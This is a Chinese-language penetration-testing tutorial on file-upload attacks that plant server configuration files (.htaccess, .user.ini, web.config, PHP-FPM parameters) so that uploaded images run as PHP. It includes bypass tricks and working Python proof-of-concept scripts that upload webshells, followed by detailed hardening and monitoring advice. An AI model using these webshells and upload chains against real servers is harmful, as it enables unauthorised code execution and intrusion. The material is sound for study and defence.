---
title: 文件上传漏洞：配置文件攻击
date: 2025-02-14 18:05:37
tags:
  - Web安全
  - 渗透测试
description: 文件上传漏洞：配置文件攻击——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## 引言

文件上传漏洞是 Web 安全中最常见的高危漏洞之一。除了常规的图片马、后缀绕过之外，**配置文件攻击**是一类容易被忽视但威力极大的利用技巧。攻击者通过上传服务器配置文件（`.htaccess`、`.user.ini`、`web.config` 等），可以在不直接上传 Webshell 的情况下获取代码执行能力，绕过诸多防护措施。

本文将系统梳理基于配置文件的文件上传攻击手法，涵盖 Apache、IIS、Nginx 等主流服务器，并提供完整的防御方案。

## 一、.htaccess 配置文件攻击

### 1.1 背景

`.htaccess` 是 Apache 的分布式配置文件。当 `AllowOverride` 未设为 `None` 时，目录下的 `.htaccess` 可以被解析生效。攻击者若能上传此文件，即可修改该目录的解析规则。

### 1.2 AddType — 将任意后缀映射为 PHP

```apache
AddType application/x-httpd-php .png
```

上传后，该目录下所有 `.png` 文件将被作为 PHP 执行。攻击者上传带 PHP 代码的图片即可获得 Webshell。

**自包含 Payload（将 .htaccess 自身当作 PHP 执行）：**

```apache
AddType application/x-httpd-php .htaccess
# <?php phpinfo(); ?>
```

### 1.3 AddHandler 与 SetHandler

`AddHandler` 比 `AddType` 更直接：

```apache
AddHandler application/x-httpd-php .jpg
AddHandler php5-script .gif
```

`SetHandler` 最为激进——该目录下**所有文件**无论后缀都按 PHP 执行：

```apache
SetHandler application/x-httpd-php
```

### 1.4 绕过技巧

**文件名绕过：**
- 大小写变体（Windows）：`.HtAccess`、`.htacceSS`
- NTFS 流：`.htaccess::$DATA`
- Unicode 等价字符编码

**内容绕过 — 构造"图片马".htaccess：**

```
# GIF89a
AddType application/x-httpd-php .png
```

文件以 `#` 开头，后续可追加任意二进制数据。图片头标识被注释掉，同时能通过 `getimagesize()` 等函数的前几字节检查。

## 二、.user.ini 配置文件攻击

### 2.1 原理

PHP 5.3.0+ 在 CGI/FastCGI 模式下支持 `.user.ini`，用于覆盖 `php.ini` 中的部分配置。该特性不限于 Apache——Nginx、IIS 等同样受影响。

生效条件：`user_ini.filename` 为默认值 `.user.ini` 且 `user_ini.cache_ttl` > 0。

### 2.2 auto_prepend_file — 前置文件注入

```ini
auto_prepend_file=shell.png
```

攻击流程：
1. 上传 `.user.ini`，内容如上
2. 上传包含 PHP 代码的 `shell.png`
3. 访问该目录下**任意 PHP 文件**（即使空文件或正常业务 `.php`）
4. `shell.png` 在被访问的 PHP 脚本执行前自动包含，代码被执行

### 2.3 auto_append_file — 后置文件注入

```ini
auto_append_file=shell.png
```

在 PHP 脚本执行完成后自动包含指定文件，可与 `auto_prepend_file` 组合使用，实现双向注入。

### 2.4 利用限制与扩展

- `user_ini.cache_ttl` 默认 300 秒，上传后需等待缓存过期（或并发高频请求撞窗口）
- 部分场景下需要 PHP 进程重载才能生效
- 攻击范围覆盖当前目录及所有子目录

**结合日志 / session 投毒：**

```ini
; 将错误日志导向 .php 文件，随后触发可控错误写入恶意代码
error_log=/var/www/html/shell.php
```

或利用 `session.upload_progress` 将可控内容写入 session 文件，再通过 `.user.ini` 包含执行。

## 三、web.config 攻击（IIS）

### 3.1 IIS 配置体系

IIS 7+ 使用 XML 配置文件。`web.config` 可放置在网站目录下覆盖上层配置。允许上传 `web.config` 意味着攻击面极大。

### 3.2 注册自定义 Handler

将 `.png` 等非脚本后缀交给 PHP 处理：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="php_png" path="*.png" verb="*"
                 modules="CgiModule"
                 scriptProcessor="C:\php\php-cgi.exe"
                 resourceType="Unspecified" requireAccess="Script" />
        </handlers>
    </system.webServer>
</configuration>
```

如果 IIS 已配置 PHP FastCGI，更简洁：

```xml
<add name="attack" path="*.jpg" verb="*"
     modules="FastCgiModule"
     scriptProcessor="C:\php\php-cgi.exe"
     resourceType="Unspecified" />
```

### 3.3 其他攻击面

- **关闭请求过滤**：`<fileExtensions allowUnlisted="true" />` 绕过上传限制
- **目录浏览泄露**：`<directoryBrowse enabled="true">`
- **重写规则注入**：通过 `<rewrite>` 构造恶意代理规则
- **禁用安全模块**：卸载 `RequestFilteringModule`

IIS + PHP 部署通常使用 FastCGI 模式，因此 `.user.ini` 同样适用，是跨平台的通杀手法。

## 四、Nginx 配置文件攻击

### 4.1 机制差异

Nginx 没有目录级分布式配置文件——这是设计哲学上的差异，无法像 Apache 或 IIS 那样上传特定文件直接覆盖目录解析规则。但攻击面依然存在。

### 4.2 include 指令滥用

若主配置使用 `include` 引入上传目录下的文件：

```nginx
include /var/www/html/upload/*.conf;  # 危险配置
```

攻击者上传 `shell.conf` 即可注入任意 Nginx 指令。

### 4.3 Nginx + PHP-FPM 联动

在 Nginx + PHP-FPM 架构下，`.user.ini` 是主要攻击向量。此外若可修改 Nginx 配置，可通过 `fastcgi_param` 注入：

```nginx
fastcgi_param PHP_VALUE "auto_prepend_file=/tmp/shell.txt";
```

### 4.4 配置文件泄露

通过路径穿越或文件读取漏洞获取 `/etc/nginx/nginx.conf`、`/etc/nginx/sites-enabled/default`，提取上游地址、内部接口等信息扩大攻击面。

## 五、PHP-FPM 配置覆盖

### 5.1 动态 php.ini 注入

FastCGI 协议中的 `PHP_VALUE` 和 `PHP_ADMIN_VALUE` 参数允许动态覆盖 PHP 配置。若攻击者能控制 `fastcgi_param`（例如通过 SSRF 打 PHP-FPM 监听端口）：

```nginx
fastcgi_param PHP_VALUE "auto_prepend_file=/tmp/shell.txt";
fastcgi_param PHP_ADMIN_VALUE "allow_url_include=On";
fastcgi_param PHP_VALUE "disable_functions=";
```

### 5.2 PHP-FPM 端口暴露 + SSRF

部分运维将 PHP-FPM 监听 `0.0.0.0:9000`。若无防火墙限制，攻击者可通过 SSRF + Gopher 协议直接与 PHP-FPM 通信，发送构造的 FastCGI 包实现任意代码执行（常用 `gopherus` 生成 payload）。

## 六、竞态条件攻击

配置文件攻击中存在多个可利用的时间窗口：

- `.user.ini` 的 `user_ini.cache_ttl` 默认 300 秒，上传后缓存期内配置不生效，攻击者可在此期间替换已上传的图片马内容，或通过高频并发请求 "撞" 上缓存刷新窗口
- 上传接口 "先写临时文件再重命名" 的机制：若可猜测 `/tmp/phpXXXXXX` 路径，可在文件被删除前通过 LFI 包含
- 多线程模型：一个线程持续上传 `.user.ini` 争取最快生效，另一个高频访问目标 PHP 等待触发

```python
# 竞态利用思路（伪代码）
thread_1: 持续上传 .user.ini       # 最短时间内让配置生效
thread_2: 高频访问目标目录 PHP 文件  # 等待 auto_prepend_file 触发
thread_3: 在触发的瞬间执行后续 payload
```

## 七、实战 PoC 示例

### 7.1 .htaccess + 图片马组合

```python
import requests

URL = "http://target.com/upload.php"

# 上传 .htaccess（伪装为 GIF）
htaccess = b"# GIF89a\nAddType application/x-httpd-php .pwn\n"
requests.post(URL, files={"file": (".htaccess", htaccess, "application/octet-stream")})

# 上传图片马
shell = b"GIF89a\n<?php system($_GET['cmd']); ?>\n"
requests.post(URL, files={"file": ("shell.pwn", shell, "image/gif")})

# 触发
r = requests.get("http://target.com/uploads/shell.pwn", params={"cmd": "id"})
print(r.text)
```

### 7.2 .user.ini + 图片马组合

```python
import requests

URL = "http://target.com/upload.php"

# Step 1: .user.ini
requests.post(URL, files={"file": (".user.ini", b"auto_prepend_file=shell.gif\n")})

# Step 2: 图片马
shell = b"GIF89a<?php @eval($_POST['x']);?>"
requests.post(URL, files={"file": ("shell.gif", shell, "image/gif")})

# Step 3: 等待 cache_ttl 过期后访问该目录任意 .php，用蚁剑/冰蝎连接
```

### 7.3 web.config 上传

```python
import requests

webconfig = '''<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers>
<add name="pwn" path="*.jpg" verb="*" modules="FastCgiModule"
    scriptProcessor="C:\\php\\php-cgi.exe" resourceType="Unspecified" />
</handlers></system.webServer></configuration>'''

requests.post("http://target.com/upload.aspx",
              files={"file": ("web.config", webconfig, "text/xml")})
```

## 八、防御方案

### 8.1 文件上传控制

- **白名单后缀**：仅允许 `.jpg`、`.png`、`.pdf` 等业务所需后缀，拒绝一切配置相关后缀
- **过滤关键文件名**：`.htaccess`、`.user.ini`、`web.config`、`*.conf` 等（含大小写变体与 NTFS 流后缀）
- **内容类型检测**：对文件的**真实 MIME 类型**（magic bytes）进行校验，不信任客户端 `Content-Type`
- **强制随机重命名**：使用 UUID / 时间戳命名，避免保留原始文件名

### 8.2 服务器加固

**Apache：**
```apache
<Directory /var/www/html/uploads>
    AllowOverride None            # 禁用 .htaccess 覆盖
</Directory>
<FilesMatch "^\.ht">
    Require all denied            # 禁止访问隐藏配置文件
</FilesMatch>
```

**Nginx：**
```nginx
location ~ /\. { deny all; return 403; }    # 禁止访问隐藏文件
location /uploads/ {
    location ~ \.php$ { deny all; }         # 上传目录禁止 PHP 执行
}
```

**IIS：**
```xml
<security><requestFiltering>
    <hiddenSegments><add segment="web.config" /></hiddenSegments>
</requestFiltering></security>
```

**PHP-FPM：**
```ini
; 禁用 .user.ini 解析（视业务需要）
user_ini.filename =
open_basedir = /var/www/html
```

### 8.3 纵深防御

- **最小权限**：Web 应用对上传目录仅授予**写入权限**，不给执行权限
- **目录隔离**：将上传文件存储在 Web 根目录之外，通过独立脚本读取输出
- **对象存储分离**：使用 OSS / S3 等独立服务，避免文件直接落在应用服务器磁盘
- **WAF 规则**：配置检测配置文件上传的规则（文件名关键词 + 内容特征）
- **定期审计**：扫描上传目录是否存在 `.htaccess`、`.user.ini` 等异常文件

### 8.4 监控告警

- 记录所有文件上传操作，特别是以 `.` 开头的隐藏文件
- 监控上传目录中非预期文件后缀的出现
- 对短时间内高频访问同一 PHP 文件的行为告警
- 审计 PHP-FPM 错误日志中异常的 `auto_prepend_file` 变更

## 九、常见误区

| 误区 | 真相 |
|------|------|
| `Content-Type` 头不可信 | 由客户端发送，可任意伪造 |
| 黑名单后缀过滤足够 | 大小写、双后缀、NTFS 流等多手段可绕过 |
| 上传目录无 .php 所以安全 | `.user.ini` 使图片马在访问其他 PHP 时执行 |
| Nginx 没有配置攻击面 | 仍受 `.user.ini` 影响，且 `include` 配置不当可被利用 |
| CDN / WAF 能完全防御 | 高级混淆和分段上传可绕过基于签名的检测 |
| 只禁 `.htaccess` 就够了 | `.htpasswd`、`.htgroup`、`.user.ini` 等其他隐藏文件同样危险 |

## 结语

配置文件攻击是文件上传漏洞利用链中的高级技巧，往往不被常规安全测试覆盖，因此成为实战渗透中的关键手段。理解各类 Web 服务器的配置机制不仅有助于发现漏洞，更能指导团队从架构层面做好防御。

安全从业者应在授权的渗透测试中充分验证此类攻击面，推动配置文件防护纳入安全基线检查项，构建纵深防御体系。

---

**免责声明：** 本文仅供安全研究与学习目的，文中涉及的技术与代码示例不得用于任何未经授权的网络攻击行为。使用者须遵守当地法律法规，在获得明确授权的环境中进行安全测试。对于滥用本文内容造成的任何后果，作者不承担任何责任。
